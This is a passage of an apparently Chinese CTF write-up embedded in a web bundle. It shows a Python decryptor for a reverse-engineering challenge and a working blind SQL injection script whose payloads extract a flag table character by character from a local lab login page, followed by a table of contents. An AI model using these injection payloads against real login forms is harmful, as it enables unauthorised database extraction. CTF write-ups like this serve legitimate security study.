    term4 = U32(sub_key ^ param_A)
    <span class="hljs-keyword">return</span> U32(U32(term1 + term2) ^ U32(term3 + term4))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plain_dwords, key</span>):
    s = [U32(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> plain_dwords]
    round_sum = U32(<span class="hljs-number">0</span>)
    delta = <span class="hljs-number">0x61C88647</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):
        v25 = U32(round_sum - delta)
        key_base_idx = (v25 &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>
        k = [key[key_base_idx ^ i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
        key_schedule = [k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>], k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>], k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>]]
        s_next = [<span class="hljs-number">0</span>] * <span class="hljs-number">10</span>
        s_next[<span class="hljs-number">0</span>] = U32(s[<span class="hljs-number">0</span>] + F(s[<span class="hljs-number">9</span>], s[<span class="hljs-number">1</span>], key_schedule[<span class="hljs-number">0</span>], v25))
        s_next[<span class="hljs-number">1</span>] = U32(s[<span class="hljs-number">1</span>] + F(s_next[<span class="hljs-number">0</span>], s[<span class="hljs-number">2</span>], key_schedule[<span class="hljs-number">1</span>], v25))
        s_next[<span class="hljs-number">2</span>] = U32(s[<span class="hljs-number">2</span>] + F(s_next[<span class="hljs-number">1</span>], s[<span class="hljs-number">3</span>], key_schedule[<span class="hljs-number">2</span>], v25))
        s_next[<span class="hljs-number">3</span>] = U32(s[<span class="hljs-number">3</span>] + F(s_next[<span class="hljs-number">2</span>], s[<span class="hljs-number">4</span>], key_schedule[<span class="hljs-number">3</span>], v25))
        s_next[<span class="hljs-number">4</span>] = U32(s[<span class="hljs-number">4</span>] + F(s_next[<span class="hljs-number">3</span>], s[<span class="hljs-number">5</span>], key_schedule[<span class="hljs-number">4</span>], v25))
        s_next[<span class="hljs-number">5</span>] = U32(s[<span class="hljs-number">5</span>] + F(s_next[<span class="hljs-number">4</span>], s[<span class="hljs-number">6</span>], key_schedule[<span class="hljs-number">5</span>], v25))
        s_next[<span class="hljs-number">6</span>] = U32(s[<span class="hljs-number">6</span>] + F(s_next[<span class="hljs-number">5</span>], s[<span class="hljs-number">7</span>], key_schedule[<span class="hljs-number">6</span>], v25))
        s_next[<span class="hljs-number">7</span>] = U32(s[<span class="hljs-number">7</span>] + F(s_next[<span class="hljs-number">6</span>], s[<span class="hljs-number">8</span>], key_schedule[<span class="hljs-number">7</span>], v25))
        s_next[<span class="hljs-number">8</span>] = U32(s[<span class="hljs-number">8</span>] + F(s_next[<span class="hljs-number">7</span>], s[<span class="hljs-number">9</span>], key_schedule[<span class="hljs-number">8</span>], v25))
        s_next[<span class="hljs-number">9</span>] = U32(s[<span class="hljs-number">9</span>] + F(s_next[<span class="hljs-number">8</span>], s_next[<span class="hljs-number">0</span>], key_schedule[<span class="hljs-number">9</span>], v25))
        s = s_next
        round_sum = v25
    <span class="hljs-keyword">return</span> s

<span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher_dwords, key</span>):
    s = [U32(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher_dwords]
    delta = <span class="hljs-number">0x61C88647</span>
    round_sum = U32(<span class="hljs-number">0</span> - delta * <span class="hljs-number">11</span>)
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):
        v25 = round_sum
        key_base_idx = (v25 &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>
        k = [key[key_base_idx ^ i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
        key_schedule = [k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>], k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>], k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>]]
        p = [<span class="hljs-number">0</span>] * <span class="hljs-number">10</span>
        p[<span class="hljs-number">9</span>] = U32(s[<span class="hljs-number">9</span>] - F(s[<span class="hljs-number">8</span>], s[<span class="hljs-number">0</span>], key_schedule[<span class="hljs-number">9</span>], v25))
        p[<span class="hljs-number">8</span>] = U32(s[<span class="hljs-number">8</span>] - F(s[<span class="hljs-number">7</span>], p[<span class="hljs-number">9</span>], key_schedule[<span class="hljs-number">8</span>], v25))
        p[<span class="hljs-number">7</span>] = U32(s[<span class="hljs-number">7</span>] - F(s[<span class="hljs-number">6</span>], p[<span class="hljs-number">8</span>], key_schedule[<span class="hljs-number">7</span>], v25))
        p[<span class="hljs-number">6</span>] = U32(s[<span class="hljs-number">6</span>] - F(s[<span class="hljs-number">5</span>], p[<span class="hljs-number">7</span>], key_schedule[<span class="hljs-number">6</span>], v25))
        p[<span class="hljs-number">5</span>] = U32(s[<span class="hljs-number">5</span>] - F(s[<span class="hljs-number">4</span>], p[<span class="hljs-number">6</span>], key_schedule[<span class="hljs-number">5</span>], v25))
        p[<span class="hljs-number">4</span>] = U32(s[<span class="hljs-number">4</span>] - F(s[<span class="hljs-number">3</span>], p[<span class="hljs-number">5</span>], key_schedule[<span class="hljs-number">4</span>], v25))
        p[<span class="hljs-number">3</span>] = U32(s[<span class="hljs-number">3</span>] - F(s[<span class="hljs-number">2</span>], p[<span class="hljs-number">4</span>], key_schedule[<span class="hljs-number">3</span>], v25))
        p[<span class="hljs-number">2</span>] = U32(s[<span class="hljs-number">2</span>] - F(s[<span class="hljs-number">1</span>], p[<span class="hljs-number">3</span>], key_schedule[<span class="hljs-number">2</span>], v25))
        p[<span class="hljs-number">1</span>] = U32(s[<span class="hljs-number">1</span>] - F(s[<span class="hljs-number">0</span>], p[<span class="hljs-number">2</span>], key_schedule[<span class="hljs-number">1</span>], v25))
        p[<span class="hljs-number">0</span>] = U32(s[<span class="hljs-number">0</span>] - F(p[<span class="hljs-number">9</span>], p[<span class="hljs-number">1</span>], key_schedule[<span class="hljs-number">0</span>], v25))
        s = p
        round_sum = U32(round_sum + delta)
    <span class="hljs-keyword">return</span> s


v10_final = [<span class="hljs-number">0x63656F6D</span>, <span class="hljs-number">0x21216674</span>]

key_final = [
    v10_final[<span class="hljs-number">0</span>], v10_final[<span class="hljs-number">1</span>],
    U32(<span class="hljs-number">0x12345678</span>), U32(<span class="hljs-number">0x9ABCDEF0</span>)
]

target_cipher_dwords = [
    <span class="hljs-number">0x5D624C34</span>, <span class="hljs-number">0x8629FEAD</span>, <span class="hljs-number">0x9D11379B</span>, <span class="hljs-number">0xFCD53211</span>,
    <span class="hljs-number">0x460F63CE</span>, <span class="hljs-number">0xC5816E68</span>, <span class="hljs-number">0xFE5300AD</span>, <span class="hljs-number">0x0A0015EE</span>,
    <span class="hljs-number">0x9806DBBB</span>, <span class="hljs-number">0xEF4A2648</span>
]

decrypted_dwords = decrypt(target_cipher_dwords, key_final)

flag_bytes = <span class="hljs-string">b&quot;&quot;</span>
<span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> decrypted_dwords:
    flag_bytes += struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, dword)

<span class="hljs-keyword">try</span>:
    decoded_flag = flag_bytes.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>).strip(<span class="hljs-string">&#x27;\\x00&#x27;</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">{decoded_flag}</span>&quot;</span>)
<span class="hljs-keyword">except</span> UnicodeDecodeError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)
</code></pre></div>
<h2 class="md-h md-h2" id="web"><span class="md-hash" aria-hidden="true">## </span><span class="md-h-text">web</span></h2>
<h3 class="md-h md-h3" id="08-第八章-天衍真言-星图显圣"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text"><strong>08 第八章 天衍真言，星图显圣</strong></span></h3>
<p>这里用的是盲注，一开始被大小写坑了，sql字符比较一般不区分大小写......</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">60 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote


base_url = <span class="hljs-string">&quot;http://127.0.0.1:50302/&quot;</span>
success_indicator = <span class="hljs-string">&quot;Welcome&quot;</span>
max_retries = <span class="hljs-number">5</span>
request_timeout = <span class="hljs-number">10</span>
max_flag_length = <span class="hljs-number">100</span>


PRIORITY_CHARS = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span> + <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span> +  <span class="hljs-string">&quot;0123456789&quot;</span> + <span class="hljs-string">&quot;_{}[]()!@#$%^&amp;*+-=;:&#x27;\\&quot;,.&lt;&gt;/?|\\\\~\` &quot;</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_payload</span>(<span class="hljs-params">payload</span>):
    encoded_payload = quote(payload)
    target_url = <span class="hljs-string">f&quot;<span class="hljs-subst">{base_url}</span>?username=<span class="hljs-subst">{encoded_payload}</span>&amp;password=123&quot;</span>
    
    <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(max_retries):
        <span class="hljs-keyword">try</span>:
            r = requests.get(target_url, timeout=request_timeout)
            <span class="hljs-keyword">if</span> success_indicator <span class="hljs-keyword">in</span> r.text:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_flag</span>():
    length = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>, <span class="hljs-number">70</span>):
        payload = <span class="hljs-string">f&quot;&#x27; or length((select * from flag))=<span class="hljs-subst">{l}</span>-- &quot;</span>
        <span class="hljs-keyword">if</span> check_payload(payload):
            length = l
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag长度: <span class="hljs-subst">{length}</span>&quot;</span>)
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:
        length = <span class="hljs-number">50</span>
    flag = <span class="hljs-string">&quot;&quot;</span>
    length+=<span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> position <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):
        found_char = <span class="hljs-literal">None</span>
        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> PRIORITY_CHARS:
            <span class="hljs-comment"># 使用BINARY强制区分大小写</span>
            payload = <span class="hljs-string">f&quot;&#x27; or BINARY substr((select * from flag),<span class="hljs-subst">{position}</span>,1)=&#x27;<span class="hljs-subst">{char}</span>&#x27;-- &quot;</span>
            
            <span class="hljs-keyword">if</span> check_payload(payload):
                found_char = char
                flag += char
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;位置 <span class="hljs-subst">{position}</span>: <span class="hljs-subst">{char}</span> | 当前flag: <span class="hljs-subst">{flag}</span>&quot;</span>)
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">if</span> found_char <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            flag += <span class="hljs-string">&quot;?&quot;</span>
    
    <span class="hljs-keyword">return</span> flag

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    flag = extract_flag()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>, flag)
</code></pre></div>
<h3 class="md-h md-h3" id="待更"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">待更......</span></h3>
<blockquote class="md-quote"><p>web太多太杂，不想写了</p>
</blockquote>
`,toc:[{depth:2,id:`misc`,text:`misc`},{depth:3,id:`rush`,text:`Rush`},{depth:3,id:`ez_lsb`,text:`ez_LSB`},{depth:3,id:`ez_锟斤拷`,text:`ez_锟斤拷????`},{depth:3,id:`sstv`,text:`SSTV`},{depth:3,id:`encrypted_pdf`,text:`encrypted_pdf`},{depth:3,id:`捂住一只耳`,text:`捂住一只耳`},{depth:3,id:`enchantment`,text:`Enchantment`},{depth:3,id:`ez_ssl`,text:`ez_ssl`},{depth:3,id:`ez_png`,text:`ez_png`},{depth:3,id:`万里挑一`,text:`万里挑一`},{depth:2,id:`pwn`,text:`pwn`},{depth:3,id:`ez_u64`,text:`ez_u64`},{depth:3,id:`eztext`,text:`EZtext`},{depth:3,id:`ezshellcode`,text:`ezshellcode`},{depth:3,id:`find-it`,text:`find it`},{depth:3,id:`认识libc`,text:`认识libc`},{depth:3,id:`ezpivot`,text:`ezpivot`},{depth:3,id:`fmt`,text:`fmt`},{depth:3,id:`randomlock`,text:`randomlock`},{depth:3,id:`str_check`,text:`str_check`},{depth:3,id:`syslock`,text:`syslock`},{depth:3,id:`xdulaker`,text:`xdulaker`},{depth:3,id:`eazylibc`,text:`eazylibc`},{depth:3,id:`fmt_s`,text:`fmt_S`},{depth:2,id:`crypto`,text:`crypto`},{depth:3,id:`ez_des`,text:`ez_DES`},{depth:3,id:`baby_next`,text:`baby_next`},{depth:3,id:`ezbsgs`,text:`ezBSGS`},{depth:3,id:`ez_square`,text:`ez_square`},{depth:3,id:`ezaes`,text:`ezAES`},{depth:3,id:`ezlegendre`,text:`ezlegendre`},{depth:3,id:`happyrsa`,text:`happyRSA`},{depth:3,id:`ezhalfgcd`,text:`ezHalfGCD`},{depth:3,id:`ledengre_revenge`,text:`Ledengre_revenge`},{depth:2,id:`reverse`,text:`reverse`},{depth:3,id:`speed`,text:`speed`},{depth:3,id:`base`,text:`base`},{depth:3,id:`catch`,text:`catch`},{depth:3,id:`upx`,text:`upx`},{depth:3,id:`ez3`,text:`ez3`},{depth:3,id:`flower`,text:`flower`},{depth:3,id:`a-cup-of-tea`,text:`A cup of tea`},{depth:3,id:`ezpy`,text:`ezpy`},{depth:3,id:`mazegame`,text:`mazegame`},{depth:3,id:`upx_revenge`,text:`upx_revenge`},{depth:3,id:`two-cups-of-tea`,text:`Two cups of tea`},{depth:2,id:`web`,text:`web`},{depth:3,id:`08-第八章-天衍真言-星图显圣`,text:`08 第八章 天衍真言，星图显圣`},{depth:3,id:`待更`,text:`待更......`}]};export{e as default};